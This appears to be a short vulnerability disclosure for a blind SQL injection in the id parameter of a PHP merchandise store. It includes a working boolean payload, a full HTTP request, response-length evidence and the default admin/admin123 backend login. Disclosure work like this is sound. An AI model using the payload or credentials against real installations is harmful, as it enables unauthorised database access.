# Merchandise Online Store v1.0 by oretnom23 has SQL injection

Author： k0xx

The password for the backend login account is: admin/admin123

vendors: https://www.sourcecodester.com/php/14887/merchandise-online-store-php-free-source-code.html

Vulnerability File: /vloggers_merch/?p=view_product&id=

Vulnerability location: /vloggers_merch/?p=view_product&id=,id

[+] Payload: /vloggers_merch/?p=view_product&id=a87ff679a2f3e71d9181a67b7542122c%27%20and%20length(database())%20=17--+ // Leak place ---> id

Current database name: vloggers_merch_db,length is 17

```sql
GET /vloggers_merch/?p=view_product&id=a87ff679a2f3e71d9181a67b7542122c%27%20and%20length(database())%20=17--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=n23o4bgngdq5q3js6l0a0i6r6k
Connection: close
```

When length (database ()) = 16, Content-Length: 29830
![image](https://user-images.githubusercontent.com/54017627/166901865-9197d5d1-930a-4b22-b584-d87062ca92b8.png)

![image](https://user-images.githubusercontent.com/54017627/166901779-c9b80043-4476-4349-b0d2-2cdba6669e68.png)

When length (database ()) = 17, Content-Length: 26131
![image](https://user-images.githubusercontent.com/54017627/166901817-a9d142e6-3591-4012-a09a-f1f5db742085.png)

![image](https://user-images.githubusercontent.com/54017627/166901732-04fa1048-68c1-4ade-bbe8-51bcd1781e37.png)
